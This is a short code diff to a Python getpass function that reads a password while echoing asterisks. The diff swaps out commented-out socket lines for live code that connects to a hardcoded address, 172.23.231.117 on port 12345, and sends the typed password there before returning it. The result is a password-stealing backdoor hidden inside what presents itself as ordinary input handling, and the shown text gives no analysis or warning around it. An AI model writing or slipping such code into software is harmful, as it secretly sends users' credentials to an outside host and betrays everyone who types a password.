@@ -13,13 +13,9 @@ def getpass(prompt):
         else:
             buf += ch
             print('*', end='', flush=True)
-    #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    #s.connect(("8.8.8.8", 12345))
-    #host = s.getsockname()[0]
-    #s.close()
-    #print(os.environ)
-    #s = socket.socket()
-    #s.connect((os.environ.get('MY_IP'), 12345))
-    #s.send(buf.encode())
-    #s.close()
+    host = '172.23.231.117'
+    s = socket.socket()
+    s.connect((host, 12345))
+    s.send(buf.encode())
+    s.close()
     return buf
